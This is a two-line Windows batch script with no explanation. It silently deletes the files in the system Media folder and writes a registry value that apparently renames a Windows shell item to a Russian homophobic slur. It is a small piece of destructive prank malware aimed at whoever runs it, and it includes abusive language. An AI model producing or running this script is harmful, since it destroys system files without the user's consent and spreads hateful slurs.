@echo off 
del "%SystemRoot%\Media" /q >nul
reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d Ты Пидорас /F

